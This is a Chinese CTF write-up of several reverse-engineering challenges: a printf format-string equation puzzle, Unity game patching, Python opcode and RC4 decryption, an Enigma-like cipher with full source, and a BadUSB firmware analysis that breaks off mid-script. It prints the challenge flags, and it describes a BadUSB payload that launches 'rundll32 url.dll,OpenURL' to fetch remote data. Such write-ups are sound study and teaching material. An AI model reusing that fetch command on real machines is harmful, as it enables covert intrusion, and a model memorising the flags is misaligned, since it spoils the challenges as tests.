<h3 id="simpleformat"><a href="#simpleformat" class="headerlink" title="simpleformat"></a>simpleformat</h3><p>这个题，是比赛开始以后发现逆向难题太难，所以加的一道简单题 = =，题目灵感来自于<figure class="highlight plain"><figcaption><span>2018 Quals```的杂项```MathGame```。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">打开程序，可以看到程序基本都在```dprintf```，往空设备里面输出了一大堆格式类似```%1$*2$s```的东西，最后还有一个```%20$n```。</span><br><span class="line"></span><br><span class="line">打过Pwn的师傅们应该都知道，在`Format String Bug`利用的时候，向任意地址写入任意值用的是`%n`这个格式串，作用是将**之前输出的字符个数**写入对应的参数指向的地址。`printf`的`$`的用法则是指定这个格式串解析的参数偏移量。例如，`%2$s`即为取出后面的第2个参数，以`%s`的形式输出。显然，`%20$n`就是将之前输出的字符个数写到第20个参数的地址里。这里可以发现，每一次`dprintf`最后第20个参数都是一个int数组中的连续元素，且就是`memcmp`的源数组。</span><br><span class="line"></span><br><span class="line">`printf`有一个神奇的格式参数是`*`，可以达到**指定宽度**的效果。例如:</span><br></pre></td></tr></table></figure></p>
<p>printf(“%.<em>s”, 5, “==========”) =&gt; “=====”<br>printf(“%0</em>d”, 20, 0) =&gt; “00000000000000000000”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">配合上`$`参数，就可以把指定参数设定为宽度，题目中```%1$*2$s```就是将第一个参数以第二个参数的宽度输出。那么，输出完```%1$*2$s```的串之后，当前输出长度即为第二个参数。下面又会再遇到一个```%1$*2$s```，那当前输出长度即为**2倍的第二个参数**。接下来每遇到一个这样的格式串，都会**累加**一次当前输出长度。</span><br><span class="line"></span><br><span class="line">加上最后的```%20$n```这个格式串，**将累加结果写入最后一个参数**，程序的功能就很明显了。这实际上是一个**线性方程组**的问题，利用```printf```来实现元素的求和。</span><br><span class="line"></span><br><span class="line">Z3，启动！</span><br><span class="line"></span><br><span class="line">// 然而出题人并没有写脚本，不过参数提取出来，解一下应该很快的吧 = =</span><br></pre></td></tr></table></figure></p>
<p>SUCTF{s1mpl3_prin7f_l1near_f0rmulas}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 话说一开始想实现一点复杂的运算的，最后时间关系只能选择线性方程组。以后有机会我会探究一下printf如何优秀地实现除了加减法以外的运算。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### RoughLike与期末大作业</span><br><span class="line"></span><br><span class="line">运行游戏，提示说有TWO SPELL 帮助你逃出迷宫。</span><br><span class="line">找到Assembly-CSharp.dll文件，运行游戏，找到一个和flag有关的函数:</span><br></pre></td></tr></table></figure></p>
<p>// Token: 0x06000193 RID: 403 RVA: 0x000110AC File Offset: 0x0000F2AC<br>private void LayoutObjectAtRandom_Flag(List<itemstype> S3cretArray, int minimum, int maximum)<br>……<br>    case 5:<br>    {<br>        vector3 position = this.randomposition();<br>        gameobject tile = s3cretarray[0].tile;<br>        unityengine.object.instantiate<gameobject>(tile, position, quaternion.identity);<br>        num = 0;<br>        continue;<br>    }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">看到这个s3cretarray之后，确定方向，要么让这个逻辑执行，要么直接找到这个s3cretarray[0].tile对象是啥。这里直接修改逻辑，将两个几乎不可能完成的逻辑修改:</span><br></pre></td></tr></table></figure></gameobject></itemstype></p>
<pre><code>case 3:
    if (GameManager.instance.playerFoodPoints != Decrypt.oro_1(59648))
    {
        num = 5;
        continue;
    }
    return;
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以及下面这一段。</span><br></pre></td></tr></table></figure>
<pre><code>case 6:
    if (GameManager.instance.defeatedMonster != Decrypt.oro_0(12))
    {
        num = 2;
        continue;
    }
    return;
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">修改逻辑之后，开始游戏就能够捡到一个道具，能够看到flag的第二部分:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://p3.ssl.qhimg.com/t0169182a5747ea70b6.png)</span><br><span class="line"></span><br><span class="line">另一部分在哪儿呢？如果看了CG动画的话，应该会知道和`SPELL`有关系。搜索 SPELL 找到一个奇怪的内容:</span><br></pre></td></tr></table></figure>
<p>this.SPText = GameObject.Find(“SPELLText”).GetComponent<text>();<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后发现这个地方可能有问题，顺着找到发现还有一处奇怪的逻辑:</span><br></pre></td></tr></table></figure></text></p>
<pre><code>case 2:
    GameManager.instance.SPText.enabled = true;
    num = 36;
    continue;
case 3:
    if (GameManager.instance.defeatedBoss &gt; Decrypt.oro_1(114))
    {
        num = 34;
        continue;
    }
    goto IL_4FC;
</code></pre><p>…<br>        case 30:<br>            if (GameManager.instance.defeatedMonster &gt; Decrypt.oro_0(514))<br>            {<br>                num = 2;<br>                continue;<br>            }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这一段逻辑显然也是难以触发的恶臭代码。于是我们这里可以再次修改逻辑（或者直接将SPText设置位可见），可以看到第一部分的flag：</span><br><span class="line">![](https://p2.ssl.qhimg.com/t010dc040c3efd59323.png)</span><br><span class="line"></span><br><span class="line">综合两个信息，得到flag为:</span><br><span class="line">WeLC0mE_70_5uc7F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Python大法好?!</span><br><span class="line"></span><br><span class="line">考点：</span><br><span class="line"></span><br><span class="line">python2.7的opcode，嵌套c，RC4加解密</span><br><span class="line"></span><br><span class="line">解题过程：</span><br><span class="line"></span><br><span class="line">拿到opcode，建议自己去写一段代码，然后获取opcode，进行对比。可能lambda那块比较难分析出来。</span><br><span class="line"></span><br><span class="line">经过分析，可以得到a.py。可以看出这是python嵌套了C，主要的加解密过程需要分析库a中的函数</span><br><span class="line"></span><br><span class="line">`IDA`分析a文件，发现导出了a函数也就是encrypt函数，但是没有解密函数，分析加密部分，是简单的RC4的实现，百度到RC4的实现(百度搜索第一条就是2333)，是一样的，所以自己对照着加密逻辑，写个类似的解密逻辑。导出aa函数。</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">void decrypt(char *k)&#123;</span><br><span class="line">	FILE *fp1, *fp2;</span><br><span class="line">	unsigned char key[256] = &#123;0x00&#125;;</span><br><span class="line">	unsigned char sbox[256] = &#123;0x00&#125;;</span><br><span class="line">	fp1 = fopen(&quot;code.txt&quot;,&quot;r&quot;);</span><br><span class="line">    fp2 = fopen(&quot;decode.txt&quot;,&quot;w&quot;);</span><br><span class="line">	DataEncrypt(k, key, sbox, fp1, fp2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot;  </span><br><span class="line">&#123;    </span><br><span class="line">   void a(char *k)&#123;</span><br><span class="line">	   encrypt(k);</span><br><span class="line">   &#125;</span><br><span class="line">   void aa(char *k)&#123;</span><br><span class="line">	   decrypt(k);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后爆破出key在python中调用c的解密函数即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">import</span> binascii <span class="keyword">as</span> b</span><br><span class="line"><span class="comment">#key="20182018"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaaa</span><span class="params">(key)</span>:</span></span><br><span class="line">	a=<span class="keyword">lambda</span> a:b.hexlify(a)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">""</span>.join(a(i) <span class="keyword">for</span> i <span class="keyword">in</span> key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aa</span><span class="params">(key)</span>:</span> <span class="comment">#jia mi</span></span><br><span class="line">	a=cdll.LoadLibrary(<span class="string">"./a"</span>).a</span><br><span class="line">	a(key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaaaa</span><span class="params">(a)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> s2n(a)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaa</span><span class="params">(key)</span>:</span> <span class="comment">#jie mi</span></span><br><span class="line">	a=cdll.LoadLibrary(<span class="string">"./a"</span>).aa</span><br><span class="line">	a(key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brup_key</span><span class="params">()</span>:</span></span><br><span class="line">	i=<span class="number">20182000</span></span><br><span class="line">	<span class="keyword">while</span> i&lt;<span class="number">100000000</span>:</span><br><span class="line">		aaa(aaaa(str(i)))</span><br><span class="line">		data=open(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"SUCTF"</span> <span class="keyword">in</span> data:</span><br><span class="line">			<span class="keyword">print</span> i</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		i=i+<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaaaaa</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment"># aa(aaaa(key))#jia mi</span></span><br><span class="line">	<span class="comment"># aaa(aaaa(key)) #jie mi</span></span><br><span class="line">	brup_key()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	aaaaaa()</span><br><span class="line">key为<span class="number">20182018</span></span><br></pre></td></tr></table></figure>
<h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>Enigma，是二战时德国所使用的转轮密码机，因为极其复杂的构造，而被翻译为“隐匿之王”。这道题也是实现了一个密码机，里面有转轮机，线性反馈移位寄存器，换位器等部件，为了增加难度，加法是由一位全加器实现。（然而善于观察的师傅们通过调试应该可以直接看出来）这道题的逆向……思路就是硬怼，从后向前把每一步逆着算出来，最后就可以拿到最初的明文。</p>
<p>附上题目源码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> buf1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[<span class="number">40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf2[<span class="number">40</span>] = &#123;<span class="number">0xa8</span>, <span class="number">0x1c</span>, <span class="number">0xaf</span>, <span class="number">0xd9</span>, <span class="number">0x0</span>, <span class="number">0x6c</span>, <span class="number">0xac</span>, <span class="number">0x2</span>, <span class="number">0x9b</span>, <span class="number">0x5</span>, <span class="number">0xe3</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0xc7</span>, <span class="number">0x78</span>, <span class="number">0x3a</span>, <span class="number">0x2</span>, <span class="number">0xbc</span>, <span class="number">0xbf</span>, <span class="number">0xb9</span>, <span class="number">0x4d</span>, <span class="number">0x1c</span>, <span class="number">0x7d</span>, <span class="number">0x6e</span>, <span class="number">0x31</span>, <span class="number">0x1b</span>, <span class="number">0x9b</span>, <span class="number">0x84</span>, <span class="number">0xd4</span>, <span class="number">0x84</span>, <span class="number">0x0</span>, <span class="number">0x76</span>, <span class="number">0x5a</span>, <span class="number">0x4d</span>, <span class="number">0x6</span>, <span class="number">0x75</span>&#125;;</span><br><span class="line"><span class="built_in">bitset</span>&lt;32&gt; buf3(<span class="number">0x5F3759DF</span>);</span><br><span class="line"><span class="comment">// SUCTF&#123;sm4ll_b1ts_c4n_d0_3v3rythin9!&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bit_add</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b, <span class="keyword">unsigned</span> <span class="keyword">char</span> c, <span class="keyword">unsigned</span> <span class="keyword">char</span>&amp; f, <span class="keyword">unsigned</span> <span class="keyword">char</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s = a ^ b ^ c;</span><br><span class="line">	f = (a &amp; c) | (b &amp; c) | (a &amp; b);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor_func</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b, <span class="keyword">unsigned</span> <span class="keyword">char</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s = a ^ b;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gg_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"GG!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">do_lfsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> new_bit = buf3[<span class="number">31</span>] ^ buf3[<span class="number">7</span>] ^ buf3[<span class="number">5</span>] ^ buf3[<span class="number">3</span>] ^ buf3[<span class="number">2</span>] ^ buf3[<span class="number">0</span>];</span><br><span class="line">	buf3 = buf3.to_ulong() &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	buf3[<span class="number">31</span>] = new_bit;</span><br><span class="line">	<span class="keyword">return</span> buf3.to_ulong();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bit_shuffle</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">bitset</span>&lt;8&gt; t;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t = buf[i];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			t[j] = t[j] ^ t[<span class="number">7</span>-j];</span><br><span class="line">			t[<span class="number">7</span>-j] = t[<span class="number">7</span>-j] ^ t[j];</span><br><span class="line">			t[j] = t[j] ^ t[<span class="number">7</span>-j]; </span><br><span class="line">		&#125;</span><br><span class="line">		buf[i] = t.to_ulong();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_xor_lfsr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>* p = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buf;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		xor_func(do_lfsr(), p[i], p[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_wheel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> wheel[<span class="number">3</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">49</span>, <span class="number">98</span>, <span class="number">147</span>, <span class="number">196</span>&#125;, &#123;<span class="number">33</span>, <span class="number">66</span>, <span class="number">99</span>, <span class="number">132</span>&#125;, &#123;<span class="number">61</span>, <span class="number">122</span>, <span class="number">183</span>, <span class="number">244</span>&#125;&#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; buf1.length(); x++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> res = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> sf = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> cf = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">bitset</span>&lt;8&gt; r(buf1[x]);</span><br><span class="line">		<span class="built_in">bitset</span>&lt;8&gt; bs_num(wheel[<span class="number">0</span>][i]);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">8</span>; b++)</span><br><span class="line">		&#123;</span><br><span class="line">			bit_add(r[b], bs_num[b], cf, cf, sf);</span><br><span class="line">			r[b] = sf;</span><br><span class="line">		&#125;</span><br><span class="line">		bs_num = wheel[<span class="number">1</span>][j];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">8</span>; b++)</span><br><span class="line">		&#123;</span><br><span class="line">			bit_add(r[b], bs_num[b], cf, cf, sf);</span><br><span class="line">			r[b] = sf;</span><br><span class="line">		&#125;</span><br><span class="line">		bs_num = wheel[<span class="number">2</span>][k];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b &lt; <span class="number">8</span>; b++)</span><br><span class="line">		&#123;</span><br><span class="line">			bit_add(r[b], bs_num[b], cf, cf, sf);</span><br><span class="line">			r[b] = sf;</span><br><span class="line">		&#125;</span><br><span class="line">		res = r.to_ulong();</span><br><span class="line">		buf[x] = res;</span><br><span class="line">		i++;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			i = <span class="number">0</span>;</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (j == <span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			j = <span class="number">0</span>;</span><br><span class="line">			k++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (k == <span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			k = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"   _____ __  ____________________"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"  / ___// / / / ____/_  __/ ____/"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"  \\__ \\/ / / / /     / / / /_  "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">" ___/ / /_/ / /___  / / / __/    "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"/____/\\____/\\____/ /_/ /_/     "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input flag: "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; buf1;</span><br><span class="line">	<span class="keyword">if</span> (buf1.length() != <span class="number">36</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		gg_func();</span><br><span class="line">	&#125;</span><br><span class="line">	do_wheel();</span><br><span class="line">	bit_shuffle();</span><br><span class="line">	do_xor_lfsr();</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">memcmp</span>(buf, buf2, <span class="number">36</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		gg_func();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"200 OK!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>// 不要吐槽辣鸡的实现方式</p>
<p>// 出题人的怨念：这个题作为难题来说还是出简单了，转轮机和反馈寄存器原本是为了产生One-Time-Pad而设计的，但在逆向中由于可以多次调试，就变成了简单的多表移位和流式密码，调出偏移就好了。如果有机会应该加入更多坑爹的东西，比如根据上一次结果动态变化的转轮（那还能逆么，pia</p>
<h3 id="RubberDucky-天枢-选手-Invicsfate"><a href="#RubberDucky-天枢-选手-Invicsfate" class="headerlink" title="RubberDucky[天枢][选手:Invicsfate]"></a>RubberDucky[天枢][选手:Invicsfate]</h3><p>badusb的题目，在HITB2018上的hex就是一道badusb的题目，这道题目同理，只是逻辑改变了，先hex2bin，arduino micro板子使用的是atmega32u4，编译器是arduino avr，在逆向时我选择了atmega32_L，程序的大致功能就是运行rundll32 url.dll,0penURL xxxxxxxxxx，从一个url上获取数据，我们只要获得这串url即可，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guess = [<span class="number">0x25</span>,<span class="number">0x16</span>,<span class="number">0x09</span>,<span class="number">0x07</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x68</span>,<span class="number">0x1B</span>,<span class="number">0xf</span>,<span class="number">0x4E</span>,<span class="number">0x12</span>,<span class="number">0x7</span>,<span class="number">0x24</span>,<span class="number">0x1b</span>,<span class="number">0xb</span>,<span class="number">0x61</span>,<span class="number">0x1A</span>,<span class="number">0x17</span>,<span class="number">0x46</span>,<span class="number">0x11</span>,<span class="number">0x6</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x1f</span>,<span class="number">0x39</span>,<span class="number">0xd</span>,<span class="number">0x25</span>,<span class="number">0x1b</span>,<span class="number">0x53</span>,<span class="number">0x16</span>,<span 